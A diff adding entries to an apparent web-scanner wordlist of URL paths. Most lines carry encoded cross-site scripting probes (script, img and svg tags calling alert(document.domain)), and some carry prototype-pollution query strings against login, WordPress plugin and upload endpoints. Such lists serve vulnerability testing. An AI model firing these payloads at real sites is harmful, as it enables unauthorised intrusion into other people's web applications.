@@ -203,3 +203,9 @@
 /?__proto__%5Bcontext%5D=%3Cimg%20src%3Dx%20onerror%3Dalert(document.domain)%3E&__proto__%5Bjquery%5D=x
 /?constructor%5Bprototype%5D%5Bcontext%5D=%3Cimg%20src%3Dx%20onerror%3Dalert(document.domain)%3E&constructor%5Bprototype%5D%5Bjquery%5D=x
 /help/index.jsp?view=%3Cscript%3Ealert(document.domain)%3C/script%3E
+/backend
+/backend/Login?error=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+/backend/Login/load/?param=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+/index.php?rest_route=/wp/v2/pages&per_page=100
+/?page_id={{search_page_id}}&type=tf_hotel&place=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&adults=2&children=1&room=1
+/?PagePrincipale/upload&file=%22%3E%3Csvg/onload=alert(document.domain)%3E
